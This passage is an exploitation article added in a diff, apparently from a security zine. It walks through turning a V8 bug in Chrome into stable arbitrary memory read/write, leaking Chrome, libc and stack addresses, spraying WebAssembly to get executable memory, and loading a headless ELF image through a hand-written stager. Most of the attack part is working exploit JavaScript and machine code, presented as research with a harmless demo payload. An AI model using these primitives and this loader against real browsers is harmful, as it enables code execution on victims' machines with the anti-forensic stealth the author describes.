+  var root_isolate_addr = itof(ftoi(addrof(e)) + BigInt(5*8));
+  var root_isolate = itof(ftoi(weak_read(root_isolate_addr)) & ~(0xffn))
+  
+  var bff = new ArrayBuffer(8)
+  var buf_addr = addrof(bff);  
+  var backing_store_addr = itof(ftoi(buf_addr) + 0x14n);
+  
+  function arb_read(addr, len, boxed=false) {
+      if (boxed && ftoi(addr) % 2n != 0) {
+          addr = itof(ftoi(root_isolate) | ftoi(addr) - 1n);
+      }
+      
+      weak_write(backing_store_addr, addr);
+      let dataview = new DataView(bff);
+  
+      let result;
+      if (len == 1) {
+          result = dataview.getUint8(0, true)
+      } else if (len == 2) {
+          result = dataview.getUint16(0, true)
+      } else if (len == 4) {
+          result = dataview.getUint32(0, true)
+      } else {
+          result = dataview.getBigUint64(0, true);
+      }
+      return result;
+  }
+  
+  function arb_write(addr, val, len, boxed=false) {
+      if (boxed && ftoi(addr) % 2n != 0) {
+          addr = itof(ftoi(root_isolate) | ftoi(addr) - 1n);
+      }
+      
+      weak_write(backing_store_addr, addr);
+      let dataview = new DataView(bff);
+  
+      if (len == 1) {
+          dataview.setUint8(0, val, true)
+      } else if (len == 2) {
+          dataview.setUint16(0, val, true)
+      } else if (len == 4) {
+          dataview.setUint32(0, val, true)
+      } else {
+          dataview.setBigUint64(0, val, true);
+      }
+      return;
+  }
+
+Achieving Stable Arbitrary Read/Write ────────────────────────────────────────────────//──
+
+Browsers heavily rely on features such as Garbage Collection in order to autonomously free
+orphan objects (objects that are not being referenced by any other object).
+
+However, we will soon cover how this introduces reliability issues in our exploit. This 
+paper will not be covering V8 Garbage Collection internals extensively as it is a broad 
+subject, but I highly encourage reading this<a href="https://v8.dev/blog/trash-talk">[8]</a> reference of Orinoco (V8 GC) and this<a href="https://deepu.tech/memory-management-in-v8/">[9]</a>
+on V8 memory management as an initial introduction to the subject.
+
+In summary, the V8 heap is split into generations, and objects are moved through these 
+generations if they survive a GC:
+
+<img src="./img/gc_02.svg" width=700px>
+
+In order to showcase an example of reliability problems introduced by the garbage 
+collector, lets showcase Orinoco's Minor GC, also known as Scavenge which is in charge
+of garbage-collecting the Young generation. When this GC takes place, live objects get 
+moved from from-space to to-space within V8's Young Generation heap:
+
+<img src="./img/2022-02-16_22-27.png" width=700px>
+
+In order to illustrate this, let's run the following script:
+
+  function force_gc() {
+      for (var i = 0; i &lt; 0x80000; ++i) {
+          var a = new ArrayBuffer();
+      }
+  }
+  
+  var b;
+  oob();
+  var c = [1.1, 1.1, 1.1]
+  var d = [{}, {}];
+  
+  %DebugPrint(b);
+  %DebugPrint(c);
+  %DebugPrint(d);
+  
+  console.log("[+] Forcing GC...")
+  force_gc();
+  
+  %DebugPrint(b);
+  %DebugPrint(c);
+  %DebugPrint(d);
+
+If we see the output of this script, we will see the following:
+
+  0x350808087859 &lt;JSArray[1073741820]&gt;
+  0x350808087889 &lt;JSArray[3]&gt;
+  0x3508080878e1 &lt;JSArray[2]&gt;
+  [+] Forcing GC...
+  0x3508083826e5 &lt;JSArray[1073741820]&gt;
+  0x3508083826f5 &lt;JSArray[3]&gt;
+  0x350808382705 &lt;JSArray[2]&gt;
+
+As we can notice, the addresses of all the objects have changed after the first <x>Scavenge GC</x>,
+as they were evacuated to <x>to-space</x> young generation region. This entails that if objects 
+change in location, the memory layout that our exploitation primitives are built on top of 
+will also change, and consequently our exploit primitives break.
+
+This specifically impacts primitives build on top of OOB reads and writes, as these will 
+be misplaced by reading <x>to-space</x> memory rather than <x>from-space</x> memory, having little
+control over the layout of live objects in this new memory region, and even if we do, 
+remaining live objects will eventually be promoted to <x>Old Space</x>.
+
+This is important to understand, because our <x>addrof</x> primitive relies on OOB reads and 
+writes, as well as our <x>arb_read</x> and <x>arb_write</x> primitives, which are bound to our 
+<x>weak_write</x> primitive that is prone to the same problem.
+
+There are likely several solutions to circumvent this problem. It is technically possible
+to craft our exploitation primitives after the promotion of dedicated objects to <x>Old Space</x>.
+However, there is always a possibility of an <x>Evacuation GC</x> to be triggered on a <x>Major GC</x>,
+which will provoke objects from <x>Old Space</x> to be rearranged for sake of memory 
+defragmentation.
+
+Although Major GCs are not triggered that often, and <x>Old Space</x> region has to be 
+fragmented from objects to be rearranged, leveraging objects in Old Space may not 
+be a long-term realiable solution.
+
+Another approach is to use objects placed within <x>Large Object Space</x> region since these 
+objects will not be garbage collected. I first saw this technique while reading Brendon 
+Tiszka's awesome post<a href="https://tiszka.com/blog/CVE_2021_21225_exploit.html">[10]</a>, in which he points out that if an object size exceeds the 
+constant <x>kMaxRegularHeapObjectSize</x><a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/common/globals.h;l=360;drc=64556d13a49f535430733d86bc5a6a0f36ae7d56">[11]</a> (defined as 1048576) that object will be placed 
+in <x>Large Object Space</x>.
+
+Following this premise, we can construct an <x>addrof</x> primitive resilient to garbage 
+collection:
+
+  /// constructing stable addrof
+  let lo_array_obj = new Array(1048577);
+  let elements_ptr = weak_read(itof(ftoi(addrof(lo_array_obj)) + 8n));
+  elements_ptr = itof(ftoi(elements_ptr) & 0xffffffffn)
+  
+  let leak_array_buffer = new ArrayBuffer(0x10);
+  let dd = new DataView(leak_array_buffer)
+  
+  let leak_array_buffer_addr = ftoi(addrof(leak_array_buffer))
+  let backing_store_ptr = itof(leak_array_buffer_addr + 0x14n);
+  
+  elements_ptr = itof(ftoi(root_isolate) | ftoi(elements_ptr) -1n);
+  weak_write(backing_store_ptr, elements_ptr)
+  
+  function stable_addrof(obj) {
+      lo_array_obj[0] = obj;
+      return itof(BigInt(dd.getUint32(0x8, true)));
+  }
+
+In order to create a set of stable arbitrary read/write primitives, we have to build 
+these primitives without relying on V8 objects that will be garbage collected.
+
+In order to achiveve this, we can overwrite the backing store of an <x>ArrayBuffer</x> with
+an arbitrary unboxed pointer that is not held within the V8 heap.
+
+This limits us to use any address residing within V8's heap. Ironically, a neat way to
+gain arbitrary read/write to any arbitrary address on the V8 heap using this technique
+(as showcased by the exploit in Brendon's post) is by leveraging our previously leaked
+<x>root_isolate</x> as the ArrayBuffer's backing store value. This address denoting the V8 
+heap base won't change for the lifetime of the current process. Modifying the bound 
+<x>DataView</x> object length will also enable using the V8 compressed untagged pointers 
+as offsets:
+
+  // constructing stable read/write for v8 heap
+  let heap = new ArrayBuffer(8);
+  let heap_accesor = new DataView(heap);
+  
+  let heap_addr_backing_store =  itof(ftoi(stable_addrof(heap)) + 0x14n);
+  let heap_accesor_length = itof(ftoi(stable_addrof(heap_accesor)) + 0x18n);
+  
+  // overwritting ArrayBuffer backing store
+  weak_write(heap_addr_backing_store, root_isolate)
+  // overwritting Dataview length
+  weak_write(heap_accesor_length, 0xffffffff);
+
+We will be using this technique in order to build accessors to distinct memory regions 
+outside of V8 heap moving forward.
+
+Obtaining relevant leaks ─────────────────────────────────────────────────────────────//──
+
+Now that we have the capability to read and write arbitrary memory in a stable manner, we
+now have to locate specific memory regions that we will need to access in order to craft 
+our SHELF loader.
+
+The following diagram illustrates the pointer relationships of the different memory 
+regions we are interested in:
+
+<img src="./img/2022-02-16_23-09_1.png" width=700px>
+
+:: Leaking Chrome Base ::
+
+Leaking chrome's base is relatively simple and can be illustrated in the following code 
+snippet:
+
+  function get_image_base(ptr) {
+      let dword = 0;
+      let centinel = ptr;
+  
+      while (dword !== 0x464c457f) {
+          centinel -= 0x1000n;
+          dword = arb_read(itof(centinel), 4);
+      }
+      return centinel;
+  }
+  
+  let div = window.document.createElement('div');
+  let div_addr = stable_addrof(div);
+  let _HTMLDivElement = itof(ftoi(div_addr) + 0xCn);
+  let HTMLDivElement_addr = weak_read(_HTMLDivElement);
+  
+  let ptr = itof((ftoi(HTMLDivElement_addr) - kBaseSearchSpaceOffset) & ~(0xfffn));
+  let chrome_base = get_image_base(ftoi(ptr));
+
+In order to leak the base address of Chrome, we start by creating an arbitrary DOM 
+element. Usually, DOM elements have references within their object layout to some part 
+of Blink's code base. As an example, we can create a div element to leak one of these 
+pointers and then subtract the appropriate offset from it to retrieve Chrome's base, or
+scan backward in search for an ELF header magic.
+
+:: Leaking Libc base ::
+
+Once we have successfully retrieved the base of Chrome, we can retrieve a pointer to 
+libc from Chrome's Global Offset Table (GOT), as this should be a fixed offset per 
+Chrome patch level. After that, we can apply the same methodology as for retrieving 
+the base address of Chrome, by scanning backward for an ELF header magic:
+
+  let libc_leak = chrome_accesor.getFloat64(kGOTOffset, true);
+  libc_leak = itof(ftoi(libc_leak) & ~(0xfffn));
+  let libc_base = get_image_base(ftoi(libc_leak));
+
+:: Leaking the process stack ::
+
+Now that we have libc's base address, we can retrieve the symbol <x>__environ</x> from libc as
+it will point to the process' environment variables held in the stack. Since for this post
+we are writing an exploit that is dependent of Chrome version, we need to be able to 
+resolve the address of this symbol independently of libc version. To do this, we can 
+build a resolver in JavaScript leveraging our stable read primitive.
+
+  let elf = new Elf(libc_base, libc_accesor);
+  let environ_addr = elf.resolve_reloc("__environ", R_X86_64_GLOB_DAT);
+  let stack_leak = libc_accesor.getBigUint64(Number(environ_addr-libc_base), true)
+
+Ultimately, we have to retrieve the address of libc's <x>DYNAMIC</x> segment to resolve various
+dynamic entries including the address of the relocation table held in <x>DT_RELA</x> in order 
+to scan for relocations, the address of <x>DT_STRTAB</x> for accessing the <x>.dynstr</x> and the 
+address of <x>DT_SYMTAB</x> for accessing symbol entries in <x>.dynsym</x>.
+
+We can then iterate the relocation table to search for the symbol we want. A snippet of 
+the relevant code of this ELF resolver to retrieve relocation entries is shown below:
+
+  let phnum = this.read(this.base_addr + offsetof_phnum, 2);
+  let phoff = this.read(this.base_addr + offsetof_phoff, 8);
+  
+  for (let i = 0n; i &lt; phnum; i++) {
+      let offset =  phoff + sizeof_Elf64_Phdr * i;
+      let p_type = this.read(this.base_addr + offset + offsetof_p_type, 4);
+  
+      if (p_type == PT_DYNAMIC) {
+          dyn_phdr = i;
+      }
+  }
+  
+  let dyn_phdr_filesz = this.read(this.base_addr + phoff + sizeof_Elf64_Phdr * dyn_phdr + offsetof_p_filesz, 8);
+  let dyn_phdr_vaddr = this.read(this.base_addr + phoff + sizeof_Elf64_Phdr * dyn_phdr + offsetof_p_vaddr, 8);
+  
+  for (let i = 0n; i &lt; dyn_phdr_filesz/sizeof_Elf64_Dyn; i++) {
+      let dyn_offset =  dyn_phdr_vaddr + sizeof_Elf64_Dyn * i;
+      let d_tag = this.read(this.base_addr + dyn_offset + offsetof_d_tag, 8);
+      let d_val = this.read(this.base_addr + dyn_offset + offsetof_d_un_d_val, 8);
+  
+      switch (d_tag) {
+          case DT_PLTGOT:
+              this.pltgot = d_val;
+              break;
+          case DT_JMPREL:
+              this.jmprel = d_val;
+              break;
+          case DT_PLTRELSZ:
+              this.pltrelsz = d_val;
+              break;
+          case DT_SYMTAB:
+              this.symtab = d_val;
+              break;
+          case DT_STRTAB:
+              this.strtab = d_val;
+              break;
+          case DT_STRSZ:
+              this.strsz = d_val;
+              break;
+          case DT_RELAENT:
+              this.relaent = d_val;
+              break;
+          case DT_RELA:
+              this.rel = d_val;
+              break;
+          case DT_RELASZ:
+              this.relasz = d_val;
+              break;
+          default:
+              break;
+      }
+  }
+  
+  let centinel, size;
+  
+  if (sym_type == R_X86_64_GLOB_DAT) {
+      centinel = this.rel;
+      size = this.relasz/this.relaent;
+  } else {
+      centinel = this.jmprel;
+      size = this.pltrelsz/this.relaent;
+  }
+  
+  for (let i = 0n; i &lt; size; i++) {
+      let rela_offset =  centinel + (sizeof_Elf64_Rela * i);
+      let r_type = this.read(rela_offset + offsetof_r_info + 0n, 4);
+      let r_sym = this.read(rela_offset + offsetof_r_info + 4n, 4);
+      let sym_address;
+  
+      if (r_type == sym_type) {
+          let sym_offset =  this.symtab + BigInt(r_sym) * sizeof_Elf64_Sym;
+          if (sym_offset == 0n) {
+              continue;
+          }
+  
+          let st_name = this.read(sym_offset + offsetof_st_name, 4);
+          if (st_name == 0n) {
+              continue;
+          }
+  
+          if (sym_type == R_X86_64_GLOB_DAT) {
+              sym_address = this.base_addr + BigInt(this.read(sym_offset + offsetof_st_value, 4));
+          } else {
+              sym_address = this.pltgot + (i + 3n) * 8n;
+          }
+  
+          if (st_name === 0n) {
+              continue
+          }
+  
+          let sym_str_addr = this.strtab + BigInt(st_name);
+          let sym_str = "";
+          let char
+  
+          while (true) {
+              char = this.read(sym_str_addr, 1);
+              if (char == 0)
+                  break;
+              sym_str += String.fromCharCode(char);
+              sym_str_addr++;
+          }
+  
+          if (sym_name == sym_str) {
+              return sym_address;
+          }
+      }
+  }
+
+Achieving a stable large RWX region ──────────────────────────────────────────────────//──
+
+Once we have leaked the location of all the memory regions we need, we now have to somehow
+allocate a big enough memory region that is both writable and executable.
+
+There are various techniques to achieve this. As documented by Brendon Tiszka, there is a
+possibility to disable W^X, a protection that was enabled on JIT memory that prevents it 
+from being both writable and executable.
+
+There is also the possibility to encode our payload as float variables in a JITed function
+to neglect the need of a writable region.
+
+However, as of today WASM memory pages are RWX, therefore that's what we will be using for
+convenience.
+
+I noticed that even if I created several WASM instances, only one RWX page was allocated,
+meaning that each Wasm instance or module does not get a dedicated RWX page. However, if 
+we spray WASM modules we will eventually force v8 to enlarge our RWX region.
+
+We can do this as follows:
+
+  // forcing V8 to generate a continuous RWX memory region of 0x801000 bytes
+  for (let i = 0; i &lt; 0x10000; i++) {
+      new WebAssembly.Instance(new WebAssembly.Module(wasm_code));
+  }
+  
+  // retrieving start address of RWX region
+  let wasm_mod = new WebAssembly.Module(wasm_code);            
+  let wasm_instance = new WebAssembly.Instance(wasm_mod);
+  let wasm_entry = wasm_instance.exports.main;
+  
+  let wasm_instance_addr = stable_addrof(wasm_instance);
+  wasm_instance_addr = ftoi(wasm_instance_addr) + 0x68n -1n;
+  let rwx_page_addr = itof(heap_accesor.getBigUint64(Number(wasm_instance_addr), true));
+
+If we check RWX regions in GDB we will see the following:
+
+  pwndbg&gt; vmmap -x -w
+  LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+      0x38f0a69f2000     0x38f0a71f3000 rwxp   801000 0      [anon_38f0a69f2]
+  pwndbg&gt;
+
+However, since we want to keep the integrity of our large RWX region, we also need to 
+handle V8's WASM code GC.<a href="https://docs.google.com/document/d/14ZId5XdETWgQHJe4Jozi-aKwCwqvDLgLuokP0gnJq6Q/edit">[12]</a>
+
+Fortunately for us, there is a flag to enable or disable this feature. This flag is 
+<x>v8::internal::FLAG_wasm_code_gc</x>. We can see it reference under <x>WasmEngine::AddPotentiallyDeadCode</x><a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wasm-engine.cc;l=1427;drc=26887614d543aaa2b9f0a7ca240a8fc631f3ede9?q=FLAG_wasm_code_gc&sq=&ss=chromium%2Fchromium%2Fsrc">[13]</a>,
+and if enabled it will eventually trigger a GC.
+
+  if (FLAG_wasm_code_gc) {
+      // Trigger a GC if 64kB plus 10% of committed code are potentially dead.
+      size_t dead_code_limit =
+      FLAG_stress_wasm_code_gc
+          ? 0
+          : 64 * KB + GetWasmCodeManager()-&gt;committed_code_space() / 10;
+      if (new_potentially_dead_code_size_ &gt; dead_code_limit) {
+      bool inc_gc_count =
+        info-&gt;num_code_gcs_triggered &lt; std::numeric_limits&lt;int8_t&gt;::max();
+      if (current_gc_info_ == nullptr) {
+      if (inc_gc_count) ++info-&gt;num_code_gcs_triggered;
+      TRACE_CODE_GC(
+          "Triggering GC (potentially dead: %zu bytes; limit: %zu bytes).\n",
+          new_potentially_dead_code_size_, dead_code_limit);
+      TriggerGC(info-&gt;num_code_gcs_triggered);
+
+Thankfully for us this flag is fetched dynamically by the WasmEngine on compilation of 
+WASM module code. Therefore, we can disable this feature on runtime by overwriting the 
+appropiate offset in Chrome:
+
+  // disabling garbage collection of wasm code
+  chrome_accesor.setBigUint64(kWasmCodeGC, 0n);
+
+Preparing a SHELF image ──────────────────────────────────────────────────────────────//──
+
+In order to prepare our SHELF executable image, first we have to create a SHELF standalone
+instance. If you are interested about the internals of this process, you can check our 
+article from tmp.0ut vol 1.
+
+The test C code we will be deploying is the following:
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main(void){
+    int k;
+    double sin() ,cos();
+    float A = 0, B = 0, i, j, z[1760];
+    char b[1760];
+    char arr[6][75] = {
+" ________  _________ _____ _   _ _\
+____   _   _       _   _____ ",
+"|_   _|  \\/  || ___ \\  _  | | | \
+|_   _| | | | |     | | / __  \\",
+"  | | | .  . || |_/ / | | | | | | \
+| |   | | | | ___ | | `' / /'",
+"  | | | |\\/| ||  __/| | | | | | |\
+ | |   | | | |/ _ \\| |   / /  ",
+"  | | | |  | || |_  \\ \\_/ / |_| \
+| | |   \\ \\_/ / (_) | | ./ /___",
+"  \\_/ \\_|  |_/\\_(_)  \\___/ \\_\
+__/  \\_/    \\___/ \\___/|_| \\_____/",
+};
+    // unobfuscated version of donut.c by Andy Sloane
+    // https://www.a1k0n.net/2006/09/15/obfuscated-c-donut.html)
+    puts("\x1b[2J");
+
+    for( ; ; ) {
+        memset(b, 32, 1760);
+        memset(z, 0, 7040);
+
+        for(j = 0; 6.28 &gt; j; j += 0.07) {
+            for(i = 0; 6.28 &gt; i; i += 0.02) {
+                float sini = sin(i),
+                      cosj = cos(j),
+                      sinA = sin(A),
+                      sinj = sin(j),
+                      cosA = cos(A),
+                      cosj2 = cosj + 2,
+                      mess = 1 / (sini * cosj2 * sinA + sinj * cosA + 5),
+                      cosi = cos(i),
+                      cosB = cos(B),
+                      sinB = sin(B),
+                      t = sini * cosj2 * cosA - sinj * sinA;
+                int x = 40 + 30 * mess * (cosi * cosj2 * cosB -t * sinB),
+                    y = 12 + 15 * mess * (cosi * cosj2 * sinB + t * cosB),
+                    o = x + 80 * y,
+                    N = 8 * ((sinj * sinA - sini * cosj * cosA) * cosB - sini * cosj
+                    * sinA - sinj * cosA - cosi * cosj * sinB);
+                if( 22 &gt; y && y &gt; 0 && x &gt; 0 &&
+                    80 &gt; x && mess &gt; z[o]){
+                    z[o] = mess;
+                    b[o] = ".,-~:;=!*#$@"[ N &gt; 0 ? N : 0];
+                }
+            }
+        }
+        puts("\x1b[d");
+    
+        for( k = 0; 1761 &gt; k; k++)
+            putchar(k % 80 ? b[k] : 10);
+
+        A += 0.04;
+        B += 0.02;
+    
+        for(int i = 0; i &lt; 6; i++)
+            puts(arr[i]);
+    
+        puts("[+] Hi from SHELF!");
+    }
+}
+
+When we create our SHELF instance, we need to make sure to make a copy of the image before
+removing its Program Header Table:
+
+  gcc-9 donut.c -lm --static-pie -T ./static-pie.ld -o test
+  cp test test_org
+  python strip_headers.py ./test
+  xxd -i ./test &gt;&gt; ./include/embedded.h
+
+We need to retrieve the <x>p_filesz</x> of the <x>PT_LOAD</x> segment of our SHELF image. This will
+be the size of our javascript payload:
+
+Entry point 0x8920
+There are 3 program headers, starting at offset 64
+
+  Program Headers:
+    Type           Offset             VirtAddr           PhysAddr
+                   FileSiz            MemSiz              Flags  Align
+    LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
+                   0x00000000000cb1f0 0x00000000000cca80  RWE    0x1000
+    DYNAMIC        0x00000000000c8c18 0x00000000000c8c18 0x00000000000c8c18
+                   0x00000000000025d8 0x0000000000003e40  RW     0x20
+    TLS            0x00000000000c5628 0x00000000000c5628 0x00000000000c5628
+                   0x0000000000000020 0x0000000000000060  RW     0x8
+
+We can create a javascript file containing the output of <x>xxd -i</x>, to then format it as a
+valid javascript file, also overwriting the value of the payload size with the value of 
+<x>p_filesz</x> as previously mentioned:
+
+  const G_AT_ENTRY = 0x8920
+  const G_AT_PHNUM = 0x3
+  
+  const phdr = new Uint8Array([
+    0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0xb1, 0x0c, 0x00,
+    ...
+  ]);
+  const payload = new Uint8Array([
+    0x04, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
+    0x47, 0x4e, 0x55, 0x00, 0x02, 0x00, 0x00, 0xc0, 0x04, 0x00, 0x00, 0x00,
+    0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x80, 0x00, 0xc0,
+      ...
+  ]);
+  const payload_len = 0xcb1f0;
+
+Once we have our SHELF image ready and accessible from our exploit, we have to set our 
+SHELF image's stack and delta offset of our headless ELF image. These offsets correspond
+to the following values:
+
+  // setting a safe address for SHELF stack
+  let shelf_stack = (stack_leak-0x80000n)  & ~(0xfffn);
+  let shelf_delta = Number(sizeof_Elf64_Ehdr + (BigInt(G_AT_PHNUM) * sizeof_Elf64_Phdr));
+
+Then we have to copy our SHELF image to our RWX region, and write a stager where the 
+original ELF headers would have been at the beginning of our SHELF image. This stager
+is in charge of jumping to the SHELF entrypoint and setting the right stack address 
+before doing so:
+
+  /* [stager] :
+      48 b8 42 42 42 42 42 42 42 42       movabs rax,0x4242424242424242
+      48 89 c4                            mov rsp,rax
+      48 31 db                            xor rbx,rbx
+      48 31 c9                            xor rcx,rcx
+      48 31 d2                            xor rdx,rdx
+      48 31 f6                            xor rsi,rsi
+      48 31 ff                            xor rdi,rdi
+      48 b8 41 41 41 41 41 41 41 41       movabs rax,0x4141414141414141
+      ff e0                               jmp rax
+  */
+  let stack_addr_bytes = bigint_to_array(shelf_stack - BigInt(8*3));
+  let entry_point_bytes = bigint_to_array(ftoi(rwx_page_addr) + BigInt(G_AT_ENTRY))
+  let stager = new Uint8Array([
+      0x48, 0xB8,
+      ...stack_addr_bytes,
+      0x48, 0x89, 0xc4,
+      0x48, 0x31, 0xdb,
+      0x48, 0x31, 0xc9,
+      0x48, 0x31, 0xd2,
+      0x48, 0x31, 0xf6,
+      0x48, 0x31, 0xff,
+      0x48, 0xb8,
+      ...entry_point_bytes,
+      0xff, 0xe0
+  ]);
+  
+  for (let i = 0; i &lt; stager.length; i++) {
+      wasm_accessor.setUint8(i, stager[i]);
+  }
+  
+  for (let i = 0; i &lt; len; i++) {
+      wasm_accessor.setUint8(shelf_delta+i, payload[i]);
+  }
+
+At this point, all we have left to do is to write the SHELF image <x>Elf64_Auxv_t</x> instance
+in the SHELF's stack:
+
+  let phdr_addr = ftoi(stable_addrof(phdr)) + 0x28n;
+  let phdr_addr_bstore = heap_accesor.getBigUint64(Number(phdr_addr -1n), true)
+  
+  stack_accesor.setBigUint64(0x00, AT_PHDR, true);
+  stack_accesor.setBigUint64(0x08, phdr_addr_bstore, true);
+  stack_accesor.setBigUint64(0x10, AT_PHNUM, true);
+  stack_accesor.setBigUint64(0x18, BigInt(G_AT_PHNUM), true);
+  stack_accesor.setBigUint64(0x20, AT_ENTRY, true);
+  stack_accesor.setBigUint64(0x28, ftoi(rwx_page_addr) + BigInt(G_AT_ENTRY), true);
+  stack_accesor.setBigUint64(0x30, AT_RANDOM, true);  
+  stack_accesor.setBigUint64(0x38, ftoi(rwx_page_addr), true);
+  stack_accesor.setBigUint64(0x40, AT_PHENT, true);  
+  stack_accesor.setBigUint64(0x48, sizeof_Elf64_Phdr, true);
+  stack_accesor.setBigUint64(0x50, AT_NULL, true);  
+  stack_accesor.setBigUint64(0x58, 0n, true);
+
+Overall, the layout of our SHELF Image can be shown in the diagram below:
+
+<img src="./img/2022-02-16_23-09.png" width=700px>
+
+To pivot control of execution to our RWX region, we can use our wasm function accessor to do:
+
+  wasm_entry();
+
+Alternatively, if we would like to use any other technique to generate a RWX region, we 
+can overwrite <x>PartitionAllocs</x> hooks to do so, much like we would do with <x>__free_hook</x>
+or <x>__malloc_hook</x> for glibc:
+
+  //base::PartitionAllocHooks::hooks_enabled_
+  chrome_accesor.setUint8(kHooksEnabled, 1);
+  //base::PartitionAllocHooks::free_observer_hook_
+  chrome_accesor.setBigUint64(kFreeObserverHook, ftoi(rwx_page_addr), true);
+
+Below is a screenshot of our test involving the execution of a SHELF image compiled with 
+<x>libm</x> on Chrome launched with the following flags:
+
+  chrome --no-sandbox --user-data-dir=/tmp
+
+<img src="./img/aaa.gif" width=700px>
+
+if we check the process tree of chrome we will see the following:
+
+
+    ├─chrome,104737        &lt;-- Browser Process
+    │   ├─chrome,104739
+    │   │   ├─chrome,104762  &lt;-- GPU Process
+    │   │       ....
+    │   ├─chrome,104740
+    │   │   ├─chrome,104948  &lt;-- Renderer process
+    │   │   │   ├─{chrome},104953
+    │   │   │   ├─{chrome},104955
+    │   │   │   ├─{chrome},104956
+    │   │   │   ├─{chrome},104961
+    │   │   │   ├─{chrome},104964
+    │   │   │   ├─{chrome},104968
+    │   │   │   ├─{chrome},104970
+    │   │   │   ├─{chrome},104971
+    │   │   │   ├─{chrome},104972
+    │   │   │   ├─{chrome},104973
+    │   │   │   └─{chrome},105004
+
+As we can observe, there are no anomalies in process-tree hierarchy. This is a simple 
+visual example, but I hope it will give the reader a glance of what kind of capability
+we can achieve with SHELF loading. The full exploit can be found <a href="https://github.com/ulexec/ChromeSHELFLoader">here.[14]</a>
+
+Conclusion ───────────────────────────────────────────────────────────────────────────//──
+
+Although reflectively loading ELF images from the browser sounds like a bit of an 
+overkill, in my opinion it is a realistic capability to achieve with SHELF loading in
+real-life exploit chains, even for chains requiring a SBX exploit. As shown by a Theori 
+blog written by Tim Becker<a href="https://blog.theori.io/research/escaping-chrome-sandbox/">[15]</a>, there are ways to implement platform-agnostic SBX exploits
+to ultimately disable the Chrome Sandbox for the subsequent use of a second unsandboxed 
+renderer exploit.
+
+Nevertheless, SHELF loading is not a universal technique for every browser exploit, and 
+there may be scenarios in which other techniques to deploy ELF files in memory would be 
+more convenient. However, I still believe that SHELF loading is an interesting avenue for
+chaining consecutive payloads with anti-forensic capabilities for browser exploits in 
+which arbitrary read/write primitives are granted, which has been a common trait for most
+V8 exploitable bugs.
+
+I would like to finalize showing my gratitude to the Tmp.0ut comunity, specifically to 
+@elfmaster, @sblip, @TMZ, @netspooky, @richinseattle & @David3141593. Last by not least,
+I would also like to show my appreciation to the content @btiszka has published in 
+relation to Chrome exploitation, as it has been a great reference and a personal source
+of motivation.
+
+Thank you for reading, and see you next year!
+
+-- @ulexec
+
+References ───────────────────────────────────────────────────────────────────────────//──
+
+[1]  <a href="https://tmpout.sh/1/10/">https://tmpout.sh/1/10/</a>
+[2]  <a href="https://chromium-review.googlesource.com/c/v8/v8/+/2062396/4/test/mjsunit/compiler/regress-1053604.js">https://chromium-review.googlesource.com/c/v8/v8/+/2062396/4/test/mjsunit/compiler/regress-1053604.js</a>
+[3]  <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1053604">https://bugs.chromium.org/p/chromium/issues/detail?id=1053604</a>
+[4]  <a href="https://v8.dev/blog/pointer-compression">https://v8.dev/blog/pointer-compression</a>
+[5]  <a href="https://v8.dev/blog/v8-release-80">https://v8.dev/blog/v8-release-80</a>
+[6]  <a href="https://leethax0.rs/2021/04/ElectricChrome/">https://leethax0.rs/2021/04/ElectricChrome/</a>
+[7]  <a href="https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping-chrome/">https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping-chrome/</a>
+[8]  <a href="https://v8.dev/blog/trash-talk">https://v8.dev/blog/trash-talk</a>
+[9]  <a href="https://deepu.tech/memory-management-in-v8/">https://deepu.tech/memory-management-in-v8/</a>
+[10] <a href="https://tiszka.com/blog/CVE_2021_21225_exploit.html">https://tiszka.com/blog/CVE_2021_21225_exploit.html</a>
+[11] <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/common/globals.h;l=360;drc=64556d13a49f535430733d86bc5a6a0f36ae7d56">https://source.chromium.org/chromium/chromium/src/+/main:v8/src/common/globals.h;l=360;drc=64556d13a49f535430733d86bc5a6a0f36ae7d56</a>
+[12] <a href="https://docs.google.com/document/d/14ZId5XdETWgQHJe4Jozi-aKwCwqvDLgLuokP0gnJq6Q/edit">https://docs.google.com/document/d/14ZId5XdETWgQHJe4Jozi-aKwCwqvDLgLuokP0gnJq6Q/edit</a>
+[13] <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wasm-engine.cc;l=1427;drc=26887614d543aaa2b9f0a7ca240a8fc631f3ede9?q=FLAG_wasm_code_gc&sq=&ss=chromium%2Fchromium%2Fsrc">https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wasm-engine.cc;</a>
+     <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wasm-engine.cc;l=1427;drc=26887614d543aaa2b9f0a7ca240a8fc631f3ede9?q=FLAG_wasm_code_gc&sq=&ss=chromium%2Fchromium%2Fsrc">l=1427;drc=26887614d543aaa2b9f0a7ca240a8fc631f3ede9?q=FLAG_wasm_code_gc&sq=&ss=chromium%2Fchromium%2Fsrc</a>
+[14] <a href="https://github.com/ulexec/ChromeSHELFLoader">https://github.com/ulexec/ChromeSHELFLoader</a>
+[15] <a href="https://blog.theori.io/research/escaping-chrome-sandbox/">https://blog.theori.io/research/escaping-chrome-sandbox/</a>
+
+</pre></div></body></html>
